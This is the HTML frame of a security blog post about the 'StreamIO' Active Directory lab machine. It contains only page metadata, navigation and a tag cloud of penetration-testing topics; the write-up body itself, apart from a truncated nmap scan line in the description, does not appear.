<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>Tracks-AD-StreamIO | ❀言わぬが花❀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="nmap123456789101112131415161718192021222324252627282930313233343536373839404110.10.11.158└─$ sudo nmap -sS 10.10.11.158 -p- --min-rate&#x3D;2000[sudo] password for fonllge: Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="Tracks-AD-StreamIO">
<meta property="og:url" content="http://example.com/2024/12/31/Tracks-AD-StreamIO/index.html">
<meta property="og:site_name" content="❀言わぬが花❀">
<meta property="og:description" content="nmap123456789101112131415161718192021222324252627282930313233343536373839404110.10.11.158└─$ sudo nmap -sS 10.10.11.158 -p- --min-rate&#x3D;2000[sudo] password for fonllge: Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2024/tracks-ad/StreamIO/background.jpg">
<meta property="article:published_time" content="2024-12-31T10:28:49.000Z">
<meta property="article:modified_time" content="2025-01-04T10:10:08.232Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="AD">
<meta property="article:tag" content="mssql">
<meta property="article:tag" content="php">
<meta property="article:tag" content="fuzz">
<meta property="article:tag" content="WriteOwner">
<meta property="article:tag" content="SQL injection">
<meta property="article:tag" content="sqlcmd">
<meta property="article:tag" content="browser">
<meta property="article:tag" content="laps">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2024/tracks-ad/StreamIO/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<script>



</script>
<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>❀言わぬが花❀ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/2FA/" rel="tag">2FA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Command-injection/" rel="tag">Command injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Configuration/" rel="tag">Configuration</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GPO/" rel="tag">GPO</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GSSAPI/" rel="tag">GSSAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Gbbion/" rel="tag">Gbbion</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HKLM/" rel="tag">HKLM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/IDOR/" rel="tag">IDOR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFR/" rel="tag">LFR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nodeport/" rel="tag">Nodeport</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/OU/" rel="tag">OU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PetitPotam/" rel="tag">PetitPotam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pseudorandom/" rel="tag">Pseudorandom</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RECYCLE-BIN/" rel="tag">RECYCLE.BIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube-Webmail/" rel="tag">Roundcube Webmail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SharPy/" rel="tag">SharPy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteGPlink/" rel="tag">WriteGPlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bbot/" rel="tag">bbot</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bloodhound/" rel="tag">bloodhound</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bookstack/" rel="tag">bookstack</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-AMSI/" rel="tag">bypass AMSI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnschef/" rel="tag">dnschef</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc14/" rel="tag">esc14</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fifo/" rel="tag">fifo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gpo/" rel="tag">gpo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ispconfig/" rel="tag">ispconfig</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jar/" rel="tag">jar</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/krbrelayx/" rel="tag">krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kube-proxy/" rel="tag">kube-proxy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/lsaquery/" rel="tag">lsaquery</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/neo4j/" rel="tag">neo4j</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ntlmrelayx/" rel="tag">ntlmrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpcclient/" rel="tag">rpcclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/service/" rel="tag">service</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/splunk/" rel="tag">splunk</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wapt/" rel="tag">wapt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
